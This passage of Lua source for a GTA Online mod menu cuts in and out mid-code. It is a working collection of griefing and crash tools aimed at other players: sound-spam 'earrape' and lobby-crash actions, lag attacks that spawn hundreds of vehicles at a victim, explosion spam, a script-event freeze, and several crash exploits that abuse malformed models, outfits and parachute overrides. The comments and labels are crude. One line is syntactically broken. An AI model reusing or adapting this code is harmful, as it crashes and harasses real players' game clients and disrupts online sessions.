            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pc.x, pc.y, pc.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', 1, 10000, 0)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List,"Sound Spam Crash", {}, "Crash Lobby", function()
        local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
        local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
            for i = 1, 20 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
            end
            util.yield()
            for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
            end
            util.yield()
        end
        util.toast("Sound Spam Crash [Lobby] executed successfully.")
    end)
    menu.action(SoundRemovals_List, "Errape Bed masturbator", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "BED", pc.x, pc.y, pc.z, "WASTEDSOUNDS", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List, "Errape ScreenFlash ", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "ScreenFlash", pc.x, pc.y, pc.z, "WastedSounds", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List, "Earrape Air_Defences", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pc.x, pc.y, pc.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List, "Errape Loser", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "LOSER", pc.x, pc.y, pc.z, "HUD_AWARDS", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List, "Errape Horny", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Horn", pc.x, pc.y, pc.z, "DLC_Apt_Yacht_Ambient_Soundset", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List, "Errape Transition Penetrator", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "1st_Person_Transition", pc.x, pc.y, pc.z, "PLAYER_SWITCH_CUSTOM_SOUNDSET", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List, "stop all sounds", {}, "", function()
        for i=-1,100 do
            AUDIO.STOP_SOUND(i)
            AUDIO.RELEASE_SOUND_ID(i)
        end
    end)

    function RequestControl(entity)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            tick = tick + 1
        end
    end

    menu.action(Plyrveh_list, "Teleport to prison", {}, "Teleport them to Prison [The player must be in a vehicle].", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            RequestControl(veh)
            ENTITY.SET_ENTITY_COORDS(veh, 1652.5746, 2569.7756, 45.564854, false, false, false, false) --tp in prison
        else
            util.toast(players.get_name(pid).. " is not in a vehicle")
        end
    end)

    local Laggers_List = menu.list(Plyrveh_list, "Laggers", {"laggers"}, "")
    menu.divider(Laggers_List, "Yatekomo Laggers")

    menu.action(Laggers_List,"Large penetrator", {}, "Lag", function() -- cpu burn simulator v2
        while not STREAMING.HAS_MODEL_LOADED(447548909) do
            STREAMING.REQUEST_MODEL(447548909)
            util.yield(10)
        end
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) --save location
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

        notification("Started lagging the fuck out of him", colors.black)
        menu.trigger_commands("anticrashcamera on")
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
        spam_amount = 300
        while spam_amount >= 1 do
            entities.create_vehicle(447548909, PlayerPedCoords, 0)
            spam_amount = spam_amount - 1
            util.yield(10)
        end
        notification("Done", colors.green) -- cpu burned congrats
        menu.trigger_commands("anticrashcamera off")
    end)

    menu.action(Laggers_List,"CPU ", {}, "do do do it", function() -- cpu burn simulator v2
        while not STREAMING.HAS_MODEL_LOADED(447548909) do
            STREAMING.REQUEST_MODEL(447548909)
            util.yield(10)
        end
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)
        menu.trigger_commands("anticrashcamera on")
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
        spam_amount = 300
        while spam_amount >= 1 do
            entities.create_vehicle(447548909, PlayerPedCoords, 0)
            spam_amount = spam_amount - 1
            util.yield(10)
        end
        menu.trigger_commands("anticrashcamera off")
    end)
    local function offset_coords_forward(pos, heading, distance)
        local newpos = pos
        heading = math.rad((heading - 180) * -1)
        newpos.x = pos.x + (math.sin(heading) * -distance)
        newpos.y = pos.y + (math.cos(heading) * -distance)
        newpos.z = pos.z
        return newpos
    end
    menu.action(Laggers_List, "Nuke", {}, "Nuke the player", function() --anonym nuke
        menu.trigger_commands("anticrashcamera on")
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = offset_coords_forward(ENTITY.GET_ENTITY_COORDS(p), ENTITY.GET_ENTITY_HEADING(p), 100)
        local defx = 0
        local defy = 0
        local defz = 0
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defz = defz + 2
        c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
         defz = defz + 2
        c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
         util.yield(50)
        defz = defz + 2
        c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        util.yield(50)
        defx = defx + 2
        defy = defy + 2
        c = offset_coords_forward(ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz), ENTITY.GET_ENTITY_HEADING(p), 300)
        FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
        while not STREAMING.HAS_MODEL_LOADED(447548909) do
            STREAMING.REQUEST_MODEL(447548909)
            util.yield(10)
        end
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local PlayerPedCoords = offset_coords_forward(ENTITY.GET_ENTITY_COORDS(player_ped, true), ENTITY.GET_ENTITY_HEADING(player_ped), 300)
        spam_amount = 300
        while spam_amount >= 1 do
            entities.create_vehicle(447548909, PlayerPedCoords, 0)
            spam_amount = spam_amount - 1
            util.yield(10)
        end
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local PlayerPedCoords = offset_coords_forward(ENTITY.GET_ENTITY_COORDS(player_ped, true), ENTITY.GET_ENTITY_HEADING(player_ped), 300)
        spam_amount = 300
        while spam_amount >= 1 do
            entities.create_vehicle(447548909, PlayerPedCoords, 0)
            spam_amount = spam_amount - 1
            util.yield(10)
        end
        local ct = 0       
        notification("Working", colors.black)
        for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            ct = ct + 1
        end
        menu.trigger_commands("anticrashcamera off")
        util.toast("Finished")
        for k, ent in pairs(entities.get_all_peds_as_handles()) do
            if not PED.IS_PED_A_PLAYER(ent) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
            end
            ct = ct + 1
        end
    end)

    menu.divider(Removals_List, "Before Crashes")

    local acams = menu.list(Removals_List, "Anti Crash Camera's", {}, "")

menu.action(acams, "Anti Crash Camera On", {"acam"}, "Activates ped regen, invisibility, levitate, freecam, reducedcollision, nocollision, showcamall, confusecamall, potatomode, stops all sound events and blocks all connections", function()
    notification("Toggling Anti Crash Camera On", colors.blue)
    util.toast("Note: Your camera is free to fly around :)")
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpfemale")

        menu.trigger_commands("invisibility" .. " On")
        menu.trigger_commands("levitate" .. " On")
        menu.trigger_commands("freecam" .. " On")
        menu.trigger_commands("potatomode on")
            menu.trigger_commands("nosky on")
        menu.trigger_commands("reducedcollision" .. " On")
        menu.trigger_commands("nocollision" .. " On")
        menu.trigger_commands("showcamall" .. " On")
        menu.trigger_commands("confuseall" .. " On")
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("superc")
        menu.trigger_commands("clean")
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    local pld = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(pld)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2698.8700)
            util.yield(1000)
        for i=1,4  do
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.2188, -818.582, 2698.8700)
                util.yield(1000)
            end
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
    end

end)

menu.action(acams, "Anti Crash Camera Off", {"acamoff"}, "Deactivates ped regen,invisibility, levitate, freecam, reducedcollision, nocollision, showcamall, confusecamall, potatomode, stops all sound events and unblocks all connections", function()
    notification("Toggling Anti Crash Camera Off", colors.blue)
    for i=-1,100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
        end
    notification("Force Stopped All Sound Events", colors.green)
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
    notification("Removed Attachments", colors.green)
        menu.trigger_commands("mpfemale")
    local player_ped = PLAYER.PLAYER_PED_ID()    
    local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
    local pld = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(pld)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.40393, -819.56366, 326.17517)
            util.yield(1000)
        for i=1,4  do
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -75.40393, -819.56366, 326.17517)
                util.yield(1000)
            end
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
        menu.trigger_commands("invisibility" .. " Off")
        menu.trigger_commands("levitate" .. " Off")
        menu.trigger_commands("freecam" .. " Off")
        menu.trigger_commands("potatomode off")
            menu.trigger_commands("nosky Off")
        menu.trigger_commands("reducedcollision" .. " Off")
        menu.trigger_commands("nocollision" .. " Off")
        menu.trigger_commands("showcamall" .. " Off")
        menu.trigger_commands("confuseall" .. " Off")
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("superc")
        menu.trigger_commands("clean")
    end

end)

menu.toggle(acams, "Panic Mode", {"panicmode"}, "This will render you basically uncrashable at the cost of disrupting all gameplay", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        notification("Toggling panic mode on... Get those cunts", colors.red)
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        notification("toggling panic mode off...", colors.red)
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)


        menu.toggle(Removals_List, "Block Player", {"block"}, "Shortcut to blocking the player join reaction ", function()
        notification("Blocked " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("historyblock" .. players.get_name(pid))
            end)

menu.action(Removals_List, "Spectate", {"spec"}, "", function()
    notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
    local hash = util.joaat("baller")
    local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            util.yield()
        end
        local Coords1 = PlayerCoords.y + 10
        local Coords2 = PlayerCoords.y - 10
    end
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
    end)

    menu.toggle_loop(newcrash, "Mega Freeze", {}, "", function()
        util.trigger_script_event(1 << pid, {1214823473, pid, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
        util.yield(500)
    end)
--------------------------------------------------------------------------------------------------------------------------------------


menu.action(newcrash, "Invalid Vehicle Data", {"vehdata"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local sentinel = util.joaat("sentinel")

    STREAMING.REQUEST_MODEL(sentinel)
    while not STREAMING.HAS_MODEL_LOADED(sentinel) do
        util.yield()
    end

    local vehicle = entities.create_vehicle(sentinel, pos, 0)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 34, 3, false)
    util.yield(1000)
    entities.delete_by_handle(vehicle)
end)

menu.action(newcrash, "Vehicle Temp Action 5G", {""}, "", function()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    local my_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local my_ped = PLAYER.GET_PLAYER_PED(players.user())
    pos.z = pos.z - 50

    BlockSyncs(pid, function()
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")

        ENTITY.FREEZE_ENTITY_POSITION(my_ped, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, pos.x, pos.y, pos.z, false, false, false)
        util.yield()
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, #allvehicles do
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
        end
        util.yield()
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z, false, false, false)
        ENTITY.FREEZE_ENTITY_POSITION(my_ped, false)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
    end)
end)

menu.action(newcrash, "Sans Undertale The Cum Reaper", {}, "recommended to stay away", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    local chop = util.joaat('cs_tenniscoach')
    STREAMING.REQUEST_MODEL(chop)
    while not STREAMING.HAS_MODEL_LOADED(chop) do
        STREAMING.REQUEST_MODEL(chop)
        util.yield()
    end
    local achop = entities.create_ped(26, chop, c, 0)
    WEAPON.GIVE_WEAPON_TO_PED(achop, util.joaat('weapon_hominglauncher'), 9999, false, false)
    TASK.TASK_COMBAT_PED(achop, p, 0, 16)
    setAttribute(achop)
    local bchop = entities.create_ped(26, chop, c, 0)
    WEAPON.GIVE_WEAPON_TO_PED(bchop, util.joaat('weapon_mg'), 9999, false, false)
    TASK.TASK_COMBAT_PED(bchop, p, 0, 16)
    setAttribute(bchop)
    util.yield(10000)
    entities.delete_by_handle(bchop)
    entities.delete_by_handle(achop)
    if not STREAMING.HAS_MODEL_LOADED(chop) then
        util.toast("Couldn't load the model")
    end
end)

menu.action(newcrash, "Child Protective Services", {"cps"}, "", function()
    local mdl = util.joaat('A_C_Poodle')
    BlockSyncs(pid, function()
        if request_model(mdl, 2) then
            local oldpos = players.get_position(players.user())
            local pos = players.get_position(pid)
            menu.trigger_commands("spectate" .. players.get_name(pid) .. " off")
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            ped1 = entities.create_ped(26, mdl, pos, 0) 
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            TASK.TASK_COMBAT_PED(ped1, ped, 0, 16)
            setAttribute(ped1)
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(250)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), oldpos.x, oldpos.y, oldpos.z, false, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
        else
            util.toast("Failed to load model. :/")
        end
    end)
end)

menu.action(newcrash, "Fake Taxi", {";)"}, "Inconsistent Garbage. Works on most menus.", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = players.get_position(pid)
    local mdl = util.joaat("mp_m_freemode_01")
    local veh_mdl = util.joaat("taxi")
    util.request_model(veh_mdl)
    util.request_model(mdl)
        for i = 1, 10 do
            if not players.exists(pid) then
                return
            end
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local jesus = entities.create_ped(2, mdl, pos, 0)
            PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
            util.yield(100)
            TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
            util.yield(1000)
            entities.delete_by_handle(jesus)
            entities.delete_by_handle(veh)
        end  
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
end)

menu.action(newcrash, "Lil Yachty", {}, "lilyachty", function()
    local user = players.user_ped()
    local pos = players.get_position(pid)
    local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
    local mdl = util.joaat("apa_mp_apa_yacht")
    menu.trigger_commands("anticrashcam on")
    BlockSyncs(pid, function()
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
        PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
        PLAYER._SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z + 300, false, false, false)
        util.yield(1000)
        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
        util.yield(250)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        PAD._SET_CONTROL_NORMAL(0, 145, 1.0)
        util.yield(250)
        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
        util.yield(1500)
    end)
    PLAYER._CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
    ENTITY.SET_ENTITY_COORDS(user, old_pos, false, false)
    menu.trigger_commands("anticrashcam off")
end)

menu.action(newcrash, "Invalid Outfit Compenents", {"outfitcomp"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    while not STREAMING.HAS_MODEL_LOADED(0x0D7114C9) do
        STREAMING.REQUEST_MODEL(0x0D7114C9)
        util.yield()
    end

    local michael = entities.create_ped(0, 0x0D7114C9, pos, 0)
    for i = 1, 20 do
        PED.SET_PED_COMPONENT_VARIATION(michael, 0, 0, 8, 0)
        PED.SET_PED_COMPONENT_VARIATION(michael, 0, 0, 9, 0)
        util.yield()
    end
    util.yield(500)
    ENTITY.SET_ENTITY_COORDS(michael, pos.x, pos.y, pos.z, true, false, false, true)
    util.yield(500)
    entities.delete_by_handle(michael)
end)

menu.action(newcrash, "North Killer", {"crashv1"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local michael = util.joaat("player_zero")
    while not STREAMING.HAS_MODEL_LOADED(michael) do
        STREAMING.REQUEST_MODEL(michael)
        util.yield()
    end
    local ped = entities.create_ped(0, michael, pos, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 6, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 7, 0)
    util.yield()
    ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, true, false, false, true)
    util.yield(500)
    entities.delete_by_handle(ped)

end)

menu.action(newcrash, "Modified Bro Hug Beta ", {"brohug"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local ped = util.joaat("a_f_y_topless_01") 
    pos.z = pos.z - 50
    while not STREAMING.HAS_MODEL_LOADED(ped) do
        STREAMING.REQUEST_MODEL(ped) 
        util.yield()
    end

    local poop = entities.create_ped (0, ped, pos, 0.0)
    (poop, poop,0.0, 0.0, 10.0, 1.0, 1, 0.0, 1.0, 1.0, false, false, false, 1.0, false, 0)
    util.yield(1000)
    entities.delete_by_handle(poop)
end)


menu.action(newcrash, "Parachute Mismatch", {"paragone"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.pid())
    BlockSyncs(pid, function()
        util.yield(500)

        local crash_parachute = util.joaat("prop_logpile_06b")
        local parachute = util.joaat("p_parachute1_mp_dec")

        STREAMING.REQUEST_MODEL(crash_parachute)
        STREAMING.REQUEST_MODEL(parachute)

        for i = 1, 3 do
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.pid(), crash_parachute)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(player, 0xFBAB5776, 1000, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player, pos.x, pos.y, pos.z + 100, 0, 0, 1)
            util.yield(1000)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(player)
            util.yield(1000)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)
        end

        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.pid(), parachute)
        util.yield(500)
    end)
end)

menu.toggle(newcrash, "Parachute Mismatch v2", {"chutemodel"}, "", function(toggle)
    local veh = entities.get_user_vehicle_as_handle()
    local model = util.joaat("apa_mp_apa_yacht")
    local normal_model = util.joaat("imp_prop_impexp_para_s")
    if toggle then
        BlockSyncsExcept(pid, true)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(entities.get_user_vehicle_as_handle(), util.joaat("apa_mp_apa_yacht"))
    else
        util.yield()
        BlockSyncsExcept(pid, false)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY()
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(veh, normal_model)
        util.toast("Parachute Returned To Normal")
    end
end)

menu.action(newcrash, "Mother Nature v1", {"nature"}, "", function()
    local user = players.user()
    local user_ped = players.user_ped()
    local model = util.joaat("h4_prop_bush_mang_ad") -- special op object so you dont have to be near them :D
    local pos = players.get_position(user)
    BlockSyncs(pid, function() -- blocking outgoing syncs to prevent the lobby from crashing :5head:
        util.yield(100)
        menu.trigger_commands("invisibility on")
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, model)
            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
            util.yield(50)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        util.yield(250)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
        menu.trigger_commands("invisibility off")
    end)
end)

menu.action(newcrash, "Mother Nature v2", {""}, "", function()
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    BlockSyncs(pid, function() 
        util.yield(100)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
        util.yield()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        util.yield(250)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
    end)
end)

menu.action(newcrash, "Bad Head Blend", {"outfitcrash"}, "", function()
    local mdl = util.joaat("mp_m_freemode_01")
    STREAMING.REQUEST_MODEL(mdl)
    local pos = v3.new(ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local usr = players.user()
    BlockSyncs(pid, function()
        util.yield()
        local old_ped = players.user_ped()
        local new_ped = entities.create_ped(2, mdl, pos, 0)
        --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
